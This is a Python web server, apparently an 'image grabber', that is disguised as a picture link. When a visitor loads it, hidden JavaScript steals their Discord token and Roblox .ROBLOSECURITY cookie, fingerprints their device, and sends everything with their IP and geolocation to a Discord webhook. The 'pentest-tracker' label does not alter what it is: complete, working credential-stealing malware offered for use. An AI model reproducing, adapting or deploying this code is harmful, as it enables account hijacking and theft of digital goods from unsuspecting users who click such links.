import json
import requests
import re
from base64 import b64decode
import os

WEBHOOK_URL = "YOUR_WEBHOOK_HERE"

def application(environ, start_response):
    path = environ.get('PATH_INFO', '')
    method = environ.get('REQUEST_METHOD', '')
    
    if path == '/grab' or path.endswith('.jpg') or path.endswith('.png'):
        return handle_grab(environ, start_response)
    elif path == '/steal':
        return handle_steal(environ, start_response)
    else:
        return handle_image(environ, start_response)

def handle_grab(environ, start_response):
    xff = environ.get('HTTP_X_FORWARDED_FOR', '')
    ip = xff.split(',')[0].strip() if xff else environ.get('REMOTE_ADDR', 'Unknown')
    ua = environ.get('HTTP_USER_AGENT', 'Unknown')[:120]
    ref = environ.get('HTTP_REFERER', 'Direct')[:120]
    lang = environ.get('HTTP_ACCEPT_LANGUAGE', 'Unknown')[:20]
    
    geo_resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=3)
    geo = geo_resp.json() if geo_resp.ok else {'city': 'Unknown', 'region': 'Unknown', 'country': 'Unknown', 'org': 'Unknown'}
    
    embed = {
        "title": "🐍 TRACKER HIT - TOKENS PENDING",
        "color": 16711680,
        "fields": [
            {"name": "🌍 IP", "value": f"`{ip}`", "inline": True},
            {"name": "📍 Geo", "value": f"`{geo['city']}, {geo['region']}`", "inline": True},
            {"name": "🏢 ISP", "value": f"`{geo.get('org', '?')}`", "inline": True},
            {"name": "💻 Browser", "value": f"`{ua}`", "inline": False},
            {"name": "🔗 Referrer", "value": f"`{ref}`", "inline": False},
            {"name": "🌐 Language", "value": f"`{lang}`", "inline": True},
            {"name": "🕒 Time", "value": "<t:{}:F>".format(int(os.times()[4])), "inline": True},
            {"name": "🔑 Discord Token", "value": "`WAITING...`", "inline": False},
            {"name": "🎮 Roblox Cookie", "value": "`WAITING...`", "inline": False}
        ],
        "footer": {"text": "pentest-tracker | python"}
    }
    
    requests.post(WEBHOOK_URL, json={'embeds': [embed]}, timeout=5)
    
    html = f"""
<!DOCTYPE html><html><head><title></title><style>body{{visibility:hidden;margin:0;padding:0}}</style></head><body>
<script>
(async()=>{{
let discord='',roblox='';
try{{discord=localStorage.getItem('token')||'';}}catch{{}}
if(!discord){{
  let iframe=document.createElement('iframe');iframe.style.display='none';document.body.appendChild(iframe);
  try{{discord=iframe.contentWindow.localStorage.getItem('token')||'';}}catch{{}}
  iframe.remove();
}}
if(!discord&&window.webpackChunkdiscord_app){{
  window.webpackChunkdiscord_app.push([[''],{{}},e=>{{
    for(let m of Object.values(e.c)){{
      if(m.exports?.default?.getToken)discord=m.exports.default.getToken();
    }}
  }}]);
}}
roblox=document.cookie.match(/\\.ROBLOSECURITY=([^;]*)/)?.[1]||'';
if(roblox&&roblox.includes('_|WARNING'))roblox=roblox.split('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')[0]||roblox;

let screen=`${screen.width}x${screen.height}`,tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
let battery=navigator.getBattery?'':navigator.getBattery().then(b=>`${(b.level*100).toFixed(0)}%`);
let conn=navigator.connection?`${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)`:'?';

const data={{discord:discord,roblox:roblox,screen:screen,tz:tz,battery:battery,conn:conn,platform:navigator.platform,plugins:navigator.plugins.length,cpu:navigator.hardwareConcurrency||'?',memory:navigator.deviceMemory||'?',cookies:document.cookie.length}};
new Image().src=`/steal?data=${btoa(JSON.stringify(data))}`;
setTimeout(()=>{{location.href='data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=';}},200);
}})();
</script></body></html>"""
    
    start_response('200 OK', [('Content-Type', 'text/html'), ('Cache-Control', 'no-cache')])
    return [html.encode('utf-8')]

def handle_steal(environ, start_response):
    query = environ.get('QUERY_STRING', '')
    data_match = re.search(r'data=([^&]+)', query)
    if data_match:
        try:
            data = json.loads(b64decode(data_match.group(1)).decode('utf-8'))
            discord = data.get('discord', '❌')[:60]
            roblox = data.get('roblox', '❌')[:60]
            
            embed = {
                "title": "💎 TOKENS + DEVICE INFO",
                "color": 16776960,
                "fields": [
                    {"name": "🔑 Discord Token", "value": f"`{discord}`", "inline": False},
                    {"name": "🎮 Roblox .ROBLOSECURITY", "value": f"`{roblox}`", "inline": False},
                    {"name": "📱 Screen", "value": f"`{data.get('screen', '?')}`", "inline": True},
                    {"name": "🌍 Timezone", "value": f"`{data.get('tz', '?')}`", "inline": True},
                    {"name": "🔋 Battery", "value": f"`{data.get('battery', '?')}`", "inline": True},
                    {"name": "📶 Network", "value": f"`{data.get('conn', '?')}`", "inline": True},
                    {"name": "💻 Platform", "value": f"`{data.get('platform', '?')}`", "inline": True},
                    {"name": "⚙️ CPU Cores", "value": f"`{data.get('cpu', '?')}`", "inline": True},
                    {"name": "💾 RAM GB", "value": f"`{data.get('memory', '?')}`", "inline": True},
                    {"name": "🍪 Cookies Count", "value": f"`{data.get('cookies', '?')}`", "inline": True},
                    {"name": "🔌 Plugins", "value": f"`{data.get('plugins', '?')}`", "inline": True}
                ],
                "thumbnail": {"url": "https://i.imgur.com/TOKEN_ICON.png"}
            }
            requests.post(WEBHOOK_URL, json={'embeds': [embed]}, timeout=5)
        except:
            pass
    
    start_response('200 OK', [('Content-Type', 'image/gif'), ('Cache-Control', 'no-cache')])
    return [b64decode('R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=')]

def handle_image(environ, start_response):
    img_url = 'https://i.imgur.com/YOUR_IMAGE.jpg'
    try:
        img_resp = requests.get(img_url, timeout=5)
        ctype = 'image/jpeg' if img_resp.headers.get('content-type', '').startswith('image/') else 'image/gif'
        start_response('200 OK', [('Content-Type', ctype), ('Cache-Control', 'public, max-age=3600')])
        return [img_resp.content]
    except:
        start_response('200 OK', [('Content-Type', 'image/gif')])
        return [b64decode('R0lGODlhAQABAIAAAP///wAAACwAAAAAAQABAAACAkQBADs=')]
